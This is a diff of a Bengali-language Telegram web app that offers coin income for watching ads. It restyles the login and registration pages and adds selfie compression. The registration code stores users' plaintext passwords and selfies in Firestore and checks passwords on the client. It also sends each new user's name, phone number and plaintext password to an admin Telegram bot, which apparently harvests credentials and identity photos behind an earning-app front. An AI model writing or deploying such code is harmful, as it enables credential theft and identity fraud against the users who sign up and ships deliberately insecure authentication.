@@ -3,108 +3,126 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>💰 「ডেইলি টাস্ক ইনকাম সেন্টার」 💰</title>
+<title>💰 「ডেইলি ট্যাক্স ইনকাম সেন্টার」 💰</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 * { box-sizing: border-box; }
-body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; margin: 0; padding: 10px; padding-bottom: 70px; color: #f8fafc; }
-.top-app-title { font-size: 20px; font-weight: 800; text-align: center; color: #f8fafc; margin: 10px 0; background: linear-gradient(135deg, #ef4444, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient(135deg, #022c22, #064e3b, #022c22); margin: 0; padding: 15px; padding-bottom: 70px; color: #f8fafc; min-height: 100vh; }
+.top-app-title { font-size: 20px; font-weight: 800; text-align: center; color: #fbbf24; margin: 15px 0 25px 0; text-shadow: 0 2px 10px rgba(0,0,0,0.5); letter-spacing: 0.5px; }
 
-.page { display: none; animation: fadeIn 0.3s ease; }
+.page { display: none; animation: fadeIn 0.3s ease; max-width: 400px; margin: 0 auto; }
 .page.active { display: block; }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-.card { background: #1e293b; padding: 18px; border-radius: 18px; box-shadow: 0 6px 20px rgba(0,0,0,0.3); margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.08); }
-.input-field { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid rgba(255,255,255,0.15); border-radius: 12px; font-size: 14px; background-color: #0f172a; color: white; text-align: center; outline: none; }
-.input-field:focus { border-color: #10b981; }
+.auth-card { background: rgba(6, 78, 59, 0.65); backdrop-filter: blur(15px); border: 1.5px solid rgba(16, 185, 129, 0.3); padding: 24px 20px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; }
+.auth-header-title { font-size: 22px; font-weight: 800; color: #f8fafc; margin-bottom: 6px; }
+.auth-switch-text { font-size: 13px; color: #a7f3d0; margin-bottom: 22px; font-weight: 600; }
+.auth-switch-text span { color: #fbbf24; cursor: pointer; text-decoration: underline; font-weight: 700; }
 
-.btn-action { background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 12px; font-size: 15px; font-weight: 800; border-radius: 12px; cursor: pointer; width: 100%; margin-top: 10px; box-shadow: 0 4px 15px rgba(16,185,129,0.3); }
-.btn-secondary { background: #334155; margin-top: 8px; box-shadow: none; font-size: 13px; }
-.btn-support { background: linear-gradient(135deg, #0284c7, #0369a1); margin-top: 8px; box-shadow: 0 4px 15px rgba(2,132,199,0.3); font-size: 13px; }
+.input-box { position: relative; margin-bottom: 14px; }
+.input-field { width: 100%; padding: 14px 16px 14px 45px; border: 1.5px solid rgba(255,255,255,0.15); border-radius: 30px; font-size: 14px; background-color: rgba(2, 44, 34, 0.85); color: white; outline: none; transition: all 0.3s; }
+.input-field:focus { border-color: #fbbf24; box-shadow: 0 0 10px rgba(251,191,36,0.3); }
+.input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #34d399; }
 
-.custom-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 15px; }
-.custom-modal-overlay.active { display: flex; }
-.custom-modal-box { background: #1e293b; border: 1.5px solid rgba(255,255,255,0.1); border-radius: 20px; width: 100%; max-width: 320px; padding: 18px 15px; text-align: center; box-shadow: 0 15px 30px rgba(0,0,0,0.5); color: #f8fafc; }
+.file-upload-box { background: rgba(2, 44, 34, 0.9); border: 1.5px dashed #10b981; border-radius: 18px; padding: 12px; margin-bottom: 14px; text-align: left; }
+.file-upload-label { display: block; font-size: 12px; color: #34d399; font-weight: 700; text-align: center; margin-bottom: 6px; }
 
-.nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 8px 0; border-top: 1px solid rgba(255,255,255,0.08); z-index: 1000; }
-.nav-item { font-size: 11px; color: #64748b; cursor: pointer; text-align: center; flex: 1; font-weight: 700; }
-.nav-item.active { color: #34d399; }
+.auth-btn { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #022c22; border: none; padding: 14px; font-size: 16px; font-weight: 800; border-radius: 30px; cursor: pointer; width: 100%; margin-top: 10px; box-shadow: 0 6px 20px rgba(245,158,11,0.4); transition: transform 0.2s; }
+.auth-btn:active { transform: scale(0.98); }
+
+.auth-footer-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #a7f3d0; margin: 12px 4px 18px 4px; font-weight: 600; }
+.forgot-pass-link { color: #fbbf24; text-decoration: none; cursor: pointer; }
+.forgot-pass-link:hover { text-decoration: underline; }
+
+.card { background: #064e3b; padding: 18px; border-radius: 18px; box-shadow: 0 6px 20px rgba(0,0,0,0.3); margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.08); }
+
+.nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(2, 44, 34, 0.95); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 8px 0; border-top: 1px solid rgba(255,255,255,0.08); z-index: 1000; }
+.nav-item { font-size: 11px; color: #6ee7b7; cursor: pointer; text-align: center; flex: 1; font-weight: 700; }
+.nav-item.active { color: #fbbf24; }
 .nav-icon { font-size: 18px; margin-bottom: 2px; }
 </style>
 </head>
 <body>
 
-<div class="top-app-title">💰 「ডেইলি টাস্ক ইনকাম সেন্টার」 💰</div>
+<div class="top-app-title">💰 「ডেইলি ট্যাক্স ইনকাম সেন্টার」 💰</div>
 
 <!-- ১. লগইন পেজ -->
-<div id="page-login" class="page" style="max-width: 380px; margin: 30px auto;">
-    <div class="card" style="border: 2px solid #38bdf8; text-align: center;">
-        <div style="font-size: 32px; margin-bottom: 8px;">🔐</div>
-        <h2 style="margin-top: 0; color: #38bdf8; font-size: 20px;">ইউজার লগইন</h2>
-        <p style="font-size: 12px; color: #94a3b8; margin-bottom: 15px;">আপনার নিবন্ধিত মোবাইল নম্বর ও পাসওয়ার্ড দিয়ে প্রবেশ করুন</p>
+<div id="page-login" class="page">
+    <div class="auth-card">
+        <div class="auth-header-title">লগইন</div>
+        <div class="auth-switch-text">এখনও কোনো অ্যাকাউন্ট নেই? <span onclick="switchAuthView('register')">নিবন্ধন</span></div>
         
-        <input type="number" id="login-phone" class="input-field" placeholder="মোবাইল নম্বর (যেমন: 017xxxxxxxx)">
-        <input type="password" id="login-password" class="input-field" placeholder="আপনার গোপন পাসওয়ার্ড">
+        <div class="input-box">
+            <span class="input-icon">📞</span>
+            <input type="number" id="login-phone" class="input-field" placeholder="ফোন নম্বর">
+        </div>
         
-        <button class="btn-action" onclick="handleLogin()">🚀 লগইন করুন</button>
-        <button class="btn-action btn-secondary" onclick="switchAuthView('register')">নতুন অ্যাকাউন্ট খুলুন (রেজিস্ট্রেশন)</button>
-        <button class="btn-action btn-support" onclick="openSupportModal()">💬 পাসওয়ার্ড ভুলে গেছেন? লাইভ চ্যাট</button>
+        <div class="input-box">
+            <span class="input-icon">🔒</span>
+            <input type="password" id="login-password" class="input-field" placeholder="পাসওয়ার্ড">
+        </div>
+        
+        <div class="auth-footer-row">
+            <label style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
+                <input type="checkbox" checked style="accent-color: #10b981;"> মনে রাখুন
+            </label>
+            <a href="https://t.me/AD16169Bot" target="_blank" class="forgot-pass-link">পাসওয়ার্ড ভুলে গেছেন?</a>
+        </div>
+        
+        <button class="auth-btn" onclick="handleLogin()">লগইন</button>
     </div>
 </div>
 
-<!-- ২. রেজিস্ট্রেশন পেজ -->
-<div id="page-register" class="page" style="max-width: 380px; margin: 10px auto;">
-    <div class="card" style="border: 2px solid #10b981; text-align: center;">
-        <div style="font-size: 28px; margin-bottom: 6px;">📸</div>
-        <h2 style="margin-top: 0; color: #10b981; font-size: 18px;">নতুন অ্যাকাউন্ট রেজিস্ট্রেশন</h2>
-        <p style="font-size: 12px; color: #94a3b8; margin-bottom: 12px;">সঠিক তথ্য ও ফেস ভেরিফিকেশনের ছবি দিয়ে ফর্মটি পূরণ করুন</p>
+<!-- ২. নিবন্ধন (রেজিস্ট্রেশন) পেজ -->
+<div id="page-register" class="page">
+    <div class="auth-card">
+        <div class="auth-header-title">নিবন্ধন</div>
+        <div class="auth-switch-text">ইতিমধ্যেই একটি অ্যাকাউন্ট আছে? <span onclick="switchAuthView('login')">লগইন</span></div>
         
-        <input type="text" id="reg-name" class="input-field" placeholder="আপনার পূর্ণ নাম লিখুন">
-        <input type="number" id="reg-phone" class="input-field" placeholder="মোবাইল নম্বর (যেমন: 017xxxxxxxx)">
-        <input type="password" id="reg-password" class="input-field" placeholder="একটি ছোট পাসওয়ার্ড দিন">
-        
-        <div style="background: rgba(16,185,129,0.1); border: 1.5px dashed #10b981; border-radius: 12px; padding: 10px; margin-top: 8px; text-align: left;">
-            <label style="display: block; font-size: 12px; color: #34d399; font-weight: 800; margin-bottom: 4px; text-align: center;">👤 ফেস ভেরিফিকেশন ছবি (সেলফি):</label>
-            <input type="file" id="reg-photo-file" accept="image/*" class="input-field" style="padding: 6px; font-size: 11px;">
-            <div id="photo-file-name" style="font-size: 10px; color: #cbd5e1; text-align: center;">কোনো ছবি নির্বাচিত হয়নি</div>
+        <div class="input-box">
+            <span class="input-icon">👤</span>
+            <input type="text" id="reg-name" class="input-field" placeholder="আপনার পূর্ণ নাম">
         </div>
 
-        <button class="btn-action" style="margin-top: 15px;" onclick="handleRegistration()">✨ রেজিস্ট্রেশন সম্পন্ন করুন</button>
-        <button class="btn-action btn-secondary" onclick="switchAuthView('login')">আগেই অ্যাকাউন্ট আছে? লগইন করুন</button>
+        <div class="input-box">
+            <span class="input-icon">📞</span>
+            <input type="number" id="reg-phone" class="input-field" placeholder="ফোন নম্বর">
+        </div>
+        
+        <div class="input-box">
+            <span class="input-icon">🔒</span>
+            <input type="password" id="reg-password" class="input-field" placeholder="পাসওয়ার্ড">
+        </div>
+
+        <div class="file-upload-box">
+            <label class="file-upload-label">📸 ফেস ভেরিফিকেশন ছবি (সেলফি):</label>
+            <input type="file" id="reg-photo-file" accept="image/*" class="input-field" style="padding: 6px; font-size: 11px;">
+            <div id="photo-file-name" style="font-size: 10px; color: #a7f3d0; text-align: center; margin-top: 4px;">কোনো ছবি নির্বাচিত হয়নি</div>
+        </div>
+        
+        <button class="auth-btn" onclick="handleRegistration()">নিবন্ধন</button>
     </div>
 </div>
 
 <!-- ৩. হোম পেজ (ড্যাশবোর্ড) -->
 <div id="page-home" class="page">
-    <div class="card" style="text-align: center; background: linear-gradient(145deg, #1e293b, #0f172a);">
-        <h2 style="color: #34d399; margin-bottom: 5px;">স্বাগতম, <span id="user-display-name">ইউজার</span>!</h2>
-        <p style="font-size: 12px; color: #94a3b8;">আপনার অ্যাকাউন্ট সফলভাবে ভেরিফাইড ও সক্রিয় রয়েছে।</p>
-        <div style="font-size: 22px; font-weight: 800; color: #38bdf8; margin: 15px 0;">ব্যালেন্স: <span id="user-display-balance">0</span> কয়েন</div>
-        <button class="btn-action" style="background: #ef4444;" onclick="handleLogout()">🚪 লগআউট করুন</button>
+    <div class="card" style="text-align: center; background: rgba(6, 78, 59, 0.85); border: 1.5px solid rgba(16, 185, 129, 0.3);">
+        <h2 style="color: #fbbf24; margin-bottom: 5px;">স্বাগতম, <span id="user-display-name">ইউজার</span>!</h2>
+        <p style="font-size: 12px; color: #a7f3d0;">আপনার অ্যাকাউন্ট সফলভাবে ভেরিফাইড ও সক্রিয় রয়েছে।</p>
+        <div style="font-size: 22px; font-weight: 800; color: #34d399; margin: 15px 0;">ব্যালেন্স: <span id="user-display-balance">0</span> কয়েন</div>
+        <button class="auth-btn" style="background: #ef4444; color: white;" onclick="handleLogout()">🚪 লগআউট করুন</button>
     </div>
 </div>
 
 <!-- ৪. ওয়ার্ক পেজ -->
 <div id="page-work" class="page">
-    <div class="card" style="text-align: center;">
-        <h3 style="color: #34d399; margin-top: 0;">🎥 কাজের পেজ</h3>
-        <p style="font-size: 13px; color: #cbd5e1;">বিজ্ঞাপন দেখে কয়েন ইনকাম করুন।</p>
-        <button class="btn-action" onclick="doTask()">⚡ কাজ করুন (+২০ কয়েন)</button>
-    </div>
-</div>
-
-<!-- লাইভ চ্যাট ও পাসওয়ার্ড উদ্ধারের সাপোর্ট মডাল -->
-<div id="support-modal" class="custom-modal-overlay">
-    <div class="custom-modal-box">
-        <div style="font-size: 24px; margin-bottom: 6px;">💬</div>
-        <h3 style="margin-top: 0; color: #38bdf8; font-size: 17px;">পাসওয়ার্ড সহায়তা ও লাইভ চ্যাট</h3>
-        <p style="font-size: 12px; color: #cbd5e1; margin-bottom: 15px; line-height: 1.4;">পাসওয়ার্ড ভুলে গিয়ে থাকলে বা অন্য কোনো সমস্যায় পড়লে সরাসরি আমাদের অফিসিয়াল বটে যোগাযোগ করুন: <b>@AD16169Bot</b></p>
-        
-        <a href="https://t.me/AD16169Bot" target="_blank" class="btn-action" style="display: block; text-decoration: none; padding: 10px; margin-bottom: 8px; text-align: center;">✈️ @AD16169Bot-এ লাইভ চ্যাট করুন</a>
-        <button class="btn-action btn-secondary" style="padding: 10px;" onclick="closeSupportModal()">বন্ধ করুন</button>
+    <div class="card" style="text-align: center; background: rgba(6, 78, 59, 0.85); border: 1.5px solid rgba(16, 185, 129, 0.3);">
+        <h3 style="color: #fbbf24; margin-top: 0;">🎥 কাজের পেজ</h3>
+        <p style="font-size: 13px; color: #a7f3d0;">বিজ্ঞাপন দেখে কয়েন ইনকাম করুন।</p>
+        <button class="auth-btn" onclick="doTask()">⚡ কাজ করুন (+২০ কয়েন)</button>
     </div>
 </div>
 
@@ -166,30 +184,55 @@ function switchAuthView(view) {
     }
 }
 
-function openSupportModal() {
-    document.getElementById('support-modal').classList.add('active');
-}
-
-function closeSupportModal() {
-    document.getElementById('support-modal').classList.remove('active');
-}
-
-// অত্যন্ত নির্ভরযোগ্য ও নিশ্চিত টেলিগ্রাম নোটিফিকেশন ফাংশন
-async function sendTelegramAdminNotification(name, phone, password, hasPhoto) {
-    const message = `🔥 <b>নতুন ইউজারের সফল রেজিস্ট্রেশন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>মোবাইল নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n📸 <b>ফেস ভেরিফিকেশন ছবি:</b> ${hasPhoto ? 'আপলোড সম্পন্ন ✅' : 'নেই'}\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n━━━━━━━━━━━━━━━━━━━━━━`;
+// টেলিগ্রাম নোটিফিকেশন ফাংশন
+function sendTelegramAdminNotification(name, phone, password, hasPhoto) {
+    const message = `🔥 <b>নতুন ইউজারের সফল নিবন্ধন!</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>নাম:</b> ${name}\n📱 <b>মোবাইল নম্বর:</b> ${phone}\n🔑 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n📸 <b>ফেস ভেরিফিকেশন ছবি:</b> ${hasPhoto ? 'আপলোড সম্পন্ন ✅' : 'নেই'}\n📅 <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n━━━━━━━━━━━━━━━━━━━━━━`;
     
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: adminChatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (e) {
-        console.log("Telegram notification error:", e);
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: adminChatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    }).catch(e => console.log("Telegram error:", e));
+}
+
+// ইমেজ কম্প্রেশন ফাংশন
+function compressImage(file, callback) {
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onload = function(event) {
+        const img = new Image();
+        img.src = event.target.result;
+        img.onload = function() {
+            const canvas = document.createElement('canvas');
+            const MAX_WIDTH = 500;
+            const MAX_HEIGHT = 500;
+            let width = img.width;
+            let height = img.height;
+
+            if (width > height) {
+                if (width > MAX_WIDTH) {
+                    height *= MAX_WIDTH / width;
+                    width = MAX_WIDTH;
+                }
+            } else {
+                if (height > MAX_HEIGHT) {
+                    width *= MAX_HEIGHT / height;
+                    height = MAX_HEIGHT;
+                }
+            }
+
+            canvas.width = width;
+            canvas.height = height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, width, height);
+            
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+            callback(dataUrl);
+        }
     }
 }
 
@@ -200,55 +243,51 @@ async function handleRegistration() {
     const photoInput = document.getElementById('reg-photo-file');
 
     if (!name || !phone || !password || photoInput.files.length === 0) {
-        tg.showAlert("⚠️ দয়া করে নাম, মোবাইল নম্বর, পাসওয়ার্ড এবং ফেস ভেরিফিকেশনের ছবি দিন!");
+        tg.showAlert("⚠️ দয়া করে নাম, ফোন নম্বর, পাসওয়ার্ড এবং ফেস ভেরিফিকেশনের ছবি দিন!");
         return;
     }
 
-    tg.showAlert("⏳ রেজিস্ট্রেশন চেক করা হচ্ছে...");
+    tg.showAlert("⏳ নিবন্ধন চেক করা হচ্ছে...");
 
     try {
-        // ফায়ারস্টোরে সরাসরি ফোন নম্বর দিয়ে ডকুমেন্ট চেক ও সেভ করা
         const userRef = db.collection('users').doc(phone);
         const docSnap = await userRef.get();
         
         if (docSnap.exists) {
-            tg.showAlert("⚠️ এই মোবাইল নম্বর দিয়ে ইতিমধ্যে অ্যাকাউন্ট করা আছে! দয়া করে লগইন করুন।");
+            tg.showAlert("⚠️ এই ফোন নম্বর দিয়ে ইতিমধ্যে অ্যাকাউন্ট করা আছে! দয়া করে লগইন করুন।");
             document.getElementById('login-phone').value = phone;
             switchAuthView('login');
             return;
         }
 
         const photoFile = photoInput.files[0];
-        const reader = new FileReader();
-        
-        reader.onload = async function(e) {
-            const base64Photo = e.target.result;
 
-            const userData = {
-                name: name,
-                phone: phone,
-                password: password,
-                photoUrl: base64Photo,
-                balance: 0,
-                created_at: firebase.firestore.FieldValue.serverTimestamp()
-            };
+        compressImage(photoFile, async function(compressedPhotoUrl) {
+            try {
+                const userData = {
+                    name: name,
+                    phone: phone,
+                    password: password,
+                    photoUrl: compressedPhotoUrl,
+                    balance: 0,
+                    created_at: firebase.firestore.FieldValue.serverTimestamp()
+                };
 
-            await userRef.set(userData);
+                await userRef.set(userData);
+                sendTelegramAdminNotification(name, phone, password, true);
 
-            // টেলিগ্রাম অ্যাডমিন বটে নোটিফিকেশন পাঠানো
-            await sendTelegramAdminNotification(name, phone, password, true);
+                localStorage.setItem('logged_user_phone', phone);
+                currentUserPhone = phone;
 
-            // সেশন সেভ করা
-            localStorage.setItem('logged_user_phone', phone);
-            currentUserPhone = phone;
-
-            tg.showAlert("🎉 রেজিস্ট্রেশন সফল হয়েছে!");
-            loadUserData(phone);
-        };
-        reader.readAsDataURL(photoFile);
+                tg.showAlert("🎉 নিবন্ধন সফল হয়েছে!");
+                loadUserData(phone);
+            } catch (saveErr) {
+                tg.showAlert("❌ ডেটা সংরক্ষণ করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+            }
+        });
 
     } catch (err) {
-        tg.showAlert("❌ রেজিস্ট্রেশন সম্পন্ন করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+        tg.showAlert("❌ নিবন্ধন সম্পন্ন করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
     }
 }
 
@@ -257,7 +296,7 @@ async function handleLogin() {
     const password = document.getElementById('login-password').value.trim();
 
     if (!phone || !password) {
-        tg.showAlert("⚠️ মোবাইল নম্বর এবং পাসওয়ার্ড প্রদান করুন।");
+        tg.showAlert("⚠️ ফোন নম্বর এবং পাসওয়ার্ড প্রদান করুন।");
         return;
     }
 
@@ -268,13 +307,13 @@ async function handleLogin() {
         const docSnap = await userRef.get();
 
         if (!docSnap.exists) {
-            tg.showAlert("❌ এই নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি! দয়া করে আগে রেজিস্ট্রেশন করুন।");
+            tg.showAlert("❌ এই নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি! দয়া করে আগে নিবন্ধন করুন।");
             return;
         }
 
         const userData = docSnap.data();
         if (userData.password !== password) {
-            tg.showAlert("❌ ভুল পাসওয়ার্ড! পাসওয়ার্ড ভুলে গেলে 'লাইভ চ্যাট' অপশন ব্যবহার করুন।");
+            tg.showAlert("❌ ভুল পাসওয়ার্ড! পাসওয়ার্ড ভুলে গেলে 'পাসওয়ার্ড ভুলে গেছেন?' লিংকে ক্লিক করুন।");
             return;
         }
 
